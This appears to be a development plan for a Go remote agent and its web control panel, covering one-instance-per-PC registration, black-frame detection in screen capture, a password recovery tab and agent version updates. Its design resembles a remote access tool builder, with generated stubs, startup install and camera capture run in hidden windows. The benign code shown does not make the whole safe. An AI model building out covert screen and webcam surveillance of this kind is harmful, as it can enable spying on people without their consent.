# Go Agent & Control Page Updates

## Summary

Fix agent registration to enforce one device per PC, fix black screen on VMs, add a password recovery tab to the control page, and update the Go agent code.

## Changes

### 1. Agent registration — one per PC (mutex)

**auto-register endpoint** (`src/routes/api/public/agent/auto-register.ts`):
- Before inserting a new device, query for an existing device with the same `pc_name` + `owner_user_id`.
- If found, update that device's token, IP, last_seen instead of creating a duplicate.
- Return the existing device's ID with a fresh token.

**Go stub** (`main.go` in stub.ts):
- Add a Windows named mutex (`CreateMutexW`) at startup using the build name as the mutex name.
- If the mutex already exists (`ERROR_ALREADY_EXISTS`), exit immediately — prevents two instances of the same build running on one PC.

### 2. Fix black screen on VMs

**Screen capture** (`screen_windows.go` in stub.ts):
- The current GDI `BitBlt` approach returns all-black frames when:
  - The VM has no interactive desktop (headless / disconnected RDP)
  - DWM composition is disabled
- Add a black-frame detection after `BitBlt`: check if all pixels in a small sample are near-zero.
- If the frame is black, retry once after calling `keybd_event(0, 0, 0, 0)` (a no-op input event that can wake the desktop on some VMs).
- If still black, send a `screen.error` message back to the UI with "black frame detected — VM may not have an active desktop session" instead of streaming blank frames silently.
- In `ScreenPanel.tsx`, show this error in the status bar so the user knows why.

### 3. Password recovery tab on the control page

**Control page** (`src/routes/control.$id.tsx`):
- Add a new tab "Recovery" with a `KeyRound` icon.
- Lazy-load a new `RecoveryPanel` component.

**New component** (`src/components/control/RecoveryPanel.tsx`):
- Fetches the device owner's profile recovery status (has token set or not).
- Allows the admin to:
  - Generate a new recovery token for the device owner.
  - View/copy the token (shown once).
  - Reset the owner's password directly (admin action).
- Uses existing `setRecoveryToken` and `recoverWithToken` server functions.

### 4. Go agent updates

- Bump agent version string from `sentinel-go/2.0` to `sentinel-go/2.1`.
- Add `jpegDims` helper function to `extras.go` for camera shot dimension extraction (referenced but may be missing).
- Add a `hideWindow` call on the camera list/capture PowerShell commands (already present but verify consistency).
- Clean up the `main()` flow: after mutex check, registration, startup install — add a log line showing the agent version.

## Technical details

### Named mutex (Windows)
```go
var (
    kernel32m       = syscall.NewLazyDLL("kernel32.dll")
    procCreateMutex = kernel32m.NewProc("CreateMutexW")
)

func singleInstance() {
    name, _ := syscall.UTF16PtrFromString("Global\\" + buildName)
    _, _, err := procCreateMutex.Call(0, 0, uintptr(unsafe.Pointer(name)))
    if err.(syscall.Errno) == 183 { // ERROR_ALREADY_EXISTS
        os.Exit(0)
    }
}
```

### Black frame detection
```go
func isBlackFrame(buf []byte, stride, w, h int) bool {
    // Sample ~64 pixels spread across the image
    step := max(1, (w*h)/64)
    for i := 0; i < w*h; i += step {
        off := i * 4
        if off+2 >= len(buf) { break }
        if buf[off] > 8 || buf[off+1] > 8 || buf[off+2] > 8 {
            return false
        }
    }
    return true
}
```

### Auto-register upsert logic
```sql
-- Pseudocode for the endpoint
SELECT id, device_token_hash FROM devices 
WHERE pc_name = $1 AND owner_user_id = $2 
LIMIT 1;
-- If found: UPDATE with new token, return existing ID
-- If not found: INSERT new device
```

## Files to create/modify

| File | Action |
|------|--------|
| `src/routes/api/public/buildserver/stub.ts` | Add mutex, black frame detection, version bump |
| `src/routes/api/public/agent/auto-register.ts` | Add upsert logic for 1-per-PC |
| `src/routes/control.$id.tsx` | Add Recovery tab |
| `src/components/control/RecoveryPanel.tsx` | New component |
| `src/components/control/ScreenPanel.tsx` | Show black frame error |
